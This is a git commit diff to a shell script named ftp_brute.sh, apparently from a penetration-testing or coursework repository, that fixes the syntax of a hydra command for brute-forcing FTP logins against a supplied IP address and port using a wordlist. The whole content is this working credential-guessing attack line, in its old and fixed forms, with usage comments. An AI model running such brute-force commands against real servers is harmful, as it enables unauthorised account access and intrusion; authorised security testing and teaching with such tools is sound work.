7f84680425b5a6c3554017f8fe6c082813e93136
Xander C <carroll.892@osu.edu>
2024-12-03 20:49:54 -0500

    Ftp Attack Syntax Fix.

--- scripts/ftp_brute.sh
+++ scripts/ftp_brute.sh
@@ -4,4 +4,4 @@
 #   ftp_brute.sh [wordlist] [ip] [port]
 
 # hydra -L [username_list] -P [password_list] -f ftp://[ip]:[port] ftp
-hydra -L $1 -P $1 -f ftp://$2:$3 ftp
+hydra -L $1 -P $1 -f ftp://$2:$3
